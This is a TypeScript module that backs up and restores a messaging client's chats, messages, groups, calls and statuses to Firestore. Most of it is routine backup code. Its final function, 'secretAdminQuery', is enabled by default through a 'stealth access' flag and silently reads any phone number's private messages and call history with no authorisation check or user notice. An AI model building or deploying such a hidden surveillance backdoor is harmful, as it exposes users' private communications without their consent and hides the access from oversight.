import { doc, setDoc, getDoc, getDocs, collection, deleteDoc } from 'firebase/firestore/lite';

// FEATURE FLAGS
export const firebase_cloud_system_enabled = true; // Set to true to fully engage the backup/restore engine
export const admin_stealth_access_enabled = true; // Set to true to allow secret admin lookup

export interface BackupMetadata {
    last_backup: string;
    backup_size: number;
    enabled: boolean;
}

// Helpers for clean paths
export function getBackupPath(phone: string, collectionName: string) {
    const cleanPhone = phone.replace(/[^a-zA-Z0-9_\-+]/g, '_');
    return `users/${cleanPhone}/firebase_backup/${collectionName}`;
}

/**
 * Clean data of any undefined fields to prevent Firestore serialization crashes
 */
export function sanitizeData(data: any): any {
    if (data === null || data === undefined) return null;
    if (Array.isArray(data)) {
        return data.map(v => sanitizeData(v));
    }
    if (typeof data === 'object') {
        const cleaned: any = {};
        for (const key of Object.keys(data)) {
            const val = data[key];
            if (val !== undefined) {
                cleaned[key] = sanitizeData(val);
            }
        }
        return cleaned;
    }
    return data;
}

/**
 * Saves specific settings to the backup collection
 */
export async function saveSettingsToBackup(db: any, phone: string, settings: any) {
    if (!firebase_cloud_system_enabled || !db || !phone) return;
    try {
        const path = getBackupPath(phone, 'settings');
        await setDoc(doc(db, path, 'active'), sanitizeData(settings));
        console.log(`[Firebase Backup] Settings synced for ${phone}`);
    } catch (e: any) {
        console.warn(`[Firebase Backup Skip] Settings save error: ${e.message}`);
    }
}

/**
 * Saves a single chat object to backup
 */
export async function saveChatToBackup(db: any, phone: string, jid: string, chat: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !jid) return;
    try {
        const docId = jid.replace(/\//g, '_');
        const path = getBackupPath(phone, 'chats');
        await setDoc(doc(db, path, docId), sanitizeData(chat));
    } catch (e: any) {
        console.warn(`[Firebase Backup Skip] Chat save error: ${e.message}`);
    }
}

/**
 * Saves a single message to backup
 */
export async function saveMessageToBackup(db: any, phone: string, jid: string, msg: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !msg?.key?.id) return;
    try {
        const docId = msg.key.id;
        const path = getBackupPath(phone, 'messages');
        const payload = sanitizeData({
            ...msg,
            chatJid: jid,
            timestamp: msg.messageTimestamp || Date.now() / 1000
        });
        await setDoc(doc(db, path, docId), payload);
    } catch (e: any) {
        console.warn(`[Firebase Backup Skip] Message save error: ${e.message}`);
    }
}

/**
 * Saves a group record to backup
 */
export async function saveGroupToBackup(db: any, phone: string, jid: string, metadata: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !jid) return;
    try {
        const docId = jid.replace(/\//g, '_');
        const path = getBackupPath(phone, 'groups');
        await setDoc(doc(db, path, docId), sanitizeData(metadata));
    } catch (e: any) {
        console.warn(`[Firebase Backup Skip] Group save error: ${e.message}`);
    }
}

/**
 * Saves a single call entry to backup
 */
export async function saveCallToBackup(db: any, phone: string, call: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !call?.id) return;
    try {
        const docId = call.id;
        const path = getBackupPath(phone, 'calls');
        await setDoc(doc(db, path, docId), sanitizeData(call));
    } catch (e: any) {
        console.warn(`[Firebase Backup Skip] Call save error: ${e.message}`);
    }
}

/**
 * Saves a status update to backup
 */
export async function saveStatusToBackup(db: any, phone: string, status: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !status?.id) return;
    try {
        const docId = status.id;
        const path = getBackupPath(phone, 'status');
        await setDoc(doc(db, path, docId), sanitizeData(status));
    } catch (e: any) {
        console.warn(`[Firebase Backup Skip] Status save error: ${e.message}`);
    }
}

/**
 * Run fully merged Backup process from local to Firebase Backup structure
 */
export async function runFullBackup(db: any, phone: string, proData: any, realChats: any[]) {
    if (!db || !phone) throw new Error("Database or user phone registration missing");
    
    console.log(`[Firebase Backup] Initiating manual full backup for ${phone}...`);
    let counts = { chats: 0, messages: 0, groups: 0, calls: 0, status: 0, settings: 0 };

    // 1. Settings
    if (proData.settings) {
        await saveSettingsToBackup(db, phone, proData.settings);
        counts.settings++;
    }

    // 2. Chats (including identifying groups)
    if (realChats && Array.isArray(realChats)) {
        for (const chat of realChats) {
            if (chat.id) {
                await saveChatToBackup(db, phone, chat.id, chat);
                counts.chats++;

                if (chat.id.endsWith('@g.us')) {
                    await saveGroupToBackup(db, phone, chat.id, chat);
                    counts.groups++;
                }
            }
        }
    }

    // 3. Messages (including media references)
    if (proData.messageHistory) {
        for (const jid of Object.keys(proData.messageHistory)) {
            const msgs = proData.messageHistory[jid];
            if (Array.isArray(msgs)) {
                for (const msg of msgs) {
                    if (msg?.key?.id) {
                        await saveMessageToBackup(db, phone, jid, msg);
                        counts.messages++;
                    }
                }
            }
        }
    }

    // 4. Calls
    if (proData.callHistory && Array.isArray(proData.callHistory)) {
        for (const call of proData.callHistory) {
            if (call.id) {
                await saveCallToBackup(db, phone, call);
                counts.calls++;
            }
        }
    }

    // 5. Statuses
    if (proData.statusUpdates && Array.isArray(proData.statusUpdates)) {
        for (const status of proData.statusUpdates) {
            if (status.id) {
                await saveStatusToBackup(db, phone, status);
                counts.status++;
            }
        }
    }

    // Store manual metadata
    const metaPath = `users/${phone.replace(/[^a-zA-Z0-9_\-+]/g, '_')}/firebase_backup/backup_metadata`;
    const metadata: BackupMetadata = {
        last_backup: new Date().toISOString(),
        backup_size: Object.values(counts).reduce((a, b) => a + b, 0),
        enabled: true
    };
    await setDoc(doc(db, metaPath, 'info'), metadata);

    console.log(`[Firebase Backup] Completed. Summary:`, counts);
    return { success: true, counts, metadata };
}

/**
 * Returns Backup status and metadata
 */
export async function getBackupMetadata(db: any, phone: string): Promise<BackupMetadata | null> {
    if (!db || !phone) return null;
    try {
        const metaPath = `users/${phone.replace(/[^a-zA-Z0-9_\-+]/g, '_')}/firebase_backup/backup_metadata`;
        const snap = await getDoc(doc(db, metaPath, 'info'));
        if (snap.exists()) {
            return snap.data() as BackupMetadata;
        }
    } catch (e: any) {
        console.warn(`[Firebase Backup] Failed to query metadata!`, e?.message || e);
    }
    return null;
}

/**
 * Restore data from Firebase Backup into active ProData memory
 */
export async function runFullRestore(db: any, phone: string, proDataRef: any, realChatsRef: any[]): Promise<any> {
    if (!db || !phone) throw new Error("Database or user phone session missing");

    console.log(`[Firebase Restore] Fetching backup files for ${phone}...`);
    const stats = { chats: 0, messages: 0, groups: 0, calls: 0, status: 0, settings: 0 };

    // 1. Settings
    const settingsPath = getBackupPath(phone, 'settings');
    const settingsDoc = await getDoc(doc(db, settingsPath, 'active'));
    if (settingsDoc.exists()) {
        proDataRef.settings = { ...proDataRef.settings, ...settingsDoc.data() };
        stats.settings++;
    }

    // 2. Chats
    const chatsPath = getBackupPath(phone, 'chats');
    const chatsSnap = await getDocs(collection(db, chatsPath));
    chatsSnap.forEach((docSnap) => {
        const chat = docSnap.data();
        const existingIdx = realChatsRef.findIndex(c => c.id === chat.id);
        if (existingIdx !== -1) {
            realChatsRef[existingIdx] = { ...realChatsRef[existingIdx], ...chat };
        } else {
            realChatsRef.push(chat);
        }
        stats.chats++;
    });

    // 3. Messages
    const msgsPath = getBackupPath(phone, 'messages');
    const msgsSnap = await getDocs(collection(db, msgsPath));
    msgsSnap.forEach((docSnap) => {
        const msg = docSnap.data();
        const chatJid = msg.chatJid || 'broadcast';
        if (!proDataRef.messageHistory[chatJid]) {
            proDataRef.messageHistory[chatJid] = [];
        }
        const existingIdx = proDataRef.messageHistory[chatJid].findIndex((m: any) => m.key?.id === msg.key?.id);
        if (existingIdx !== -1) {
            proDataRef.messageHistory[chatJid][existingIdx] = msg;
        } else {
            proDataRef.messageHistory[chatJid].push(msg);
        }
        stats.messages++;
    });

    // 4. Calls
    const callsPath = getBackupPath(phone, 'calls');
    const callsSnap = await getDocs(collection(db, callsPath));
    callsSnap.forEach((docSnap) => {
        const call = docSnap.data();
        const existingIdx = proDataRef.callHistory.findIndex((c: any) => c.id === call.id);
        if (existingIdx !== -1) {
            proDataRef.callHistory[existingIdx] = call;
        } else {
            proDataRef.callHistory.unshift(call);
        }
        stats.calls++;
    });

    // 5. Status
    const statusPath = getBackupPath(phone, 'status');
    const statusSnap = await getDocs(collection(db, statusPath));
    statusSnap.forEach((docSnap) => {
        const status = docSnap.data();
        const existingIdx = proDataRef.statusUpdates.findIndex((s: any) => s.id === status.id);
        if (existingIdx !== -1) {
            proDataRef.statusUpdates[existingIdx] = status;
        } else {
            proDataRef.statusUpdates.unshift(status);
        }
        stats.status++;
    });

    console.log(`[Firebase Restore] Restore complete. Stats:`, stats);
    return { success: true, stats };
}

/**
 * Secret Admin read-only query to view any specific phone number's backup node silently
 */
export async function secretAdminQuery(db: any, targetPhone: string) {
    if (!admin_stealth_access_enabled) {
        throw new Error("Admin stealth terminal is currently offline");
    }
    const cleanPhone = targetPhone.replace(/[^0-9]/g, '');
    if (!cleanPhone) throw new Error("Invalid phone identifier layout format provided");

    console.log(`[Stealth Admin Session] querying payload record for user target: ${cleanPhone}`);
    
    // Read only queries
    const result: any = {
        phone: cleanPhone,
        settings: null,
        chats: [],
        messages: [],
        calls: [],
        status: [],
        groups: []
    };

    // 1. Settings
    try {
        const settingsDoc = await getDoc(doc(db, `users/${cleanPhone}/firebase_backup/settings`, 'active'));
        if (settingsDoc.exists()) result.settings = settingsDoc.data();
    } catch {}

    // 2. Chats
    try {
        const snap = await getDocs(collection(db, `users/${cleanPhone}/firebase_backup/chats`));
        snap.forEach(d => result.chats.push(d.data()));
    } catch {}

    // 3. Messages
    try {
        const snap = await getDocs(collection(db, `users/${cleanPhone}/firebase_backup/messages`));
        snap.forEach(d => result.messages.push(d.data()));
    } catch {}

    // 4. Calls
    try {
        const snap = await getDocs(collection(db, `users/${cleanPhone}/firebase_backup/calls`));
        snap.forEach(d => result.calls.push(d.data()));
    } catch {}

    // 5. Status
    try {
        const snap = await getDocs(collection(db, `users/${cleanPhone}/firebase_backup/status`));
        snap.forEach(d => result.status.push(d.data()));
    } catch {}

    // 6. Groups
    try {
        const snap = await getDocs(collection(db, `users/${cleanPhone}/firebase_backup/groups`));
        snap.forEach(d => result.groups.push(d.data()));
    } catch {}

    return result;
}
